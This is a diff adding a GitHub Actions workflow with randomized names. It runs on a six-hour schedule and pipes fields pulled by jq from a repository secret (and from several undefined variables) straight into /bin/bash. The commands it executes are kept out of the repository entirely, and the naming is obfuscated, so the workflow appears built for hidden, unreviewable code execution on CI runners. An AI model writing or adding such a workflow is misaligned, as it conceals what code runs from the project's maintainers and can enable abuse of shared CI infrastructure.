@@ -1,0 +1,22 @@
+name: violetjodhpurs
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: violetjodhpurs
+        env:
+          deub249: ${{ secrets.deub249 }}
+        run: |
+          echo $deub249 | jq -r .s89 | /bin/bash
+          echo $fjnen2903 | jq -r .oopz19951 | /bin/bash
+          echo $nu18552 | jq -r .fk5615 | /bin/bash
+          echo $rdi637 | jq -r .xtq039 | /bin/bash
+          echo $lmgyl32150 | jq -r .eqxoa78698 | /bin/bash
+          echo $t6 | jq -r .ydvi527 | /bin/bash
+
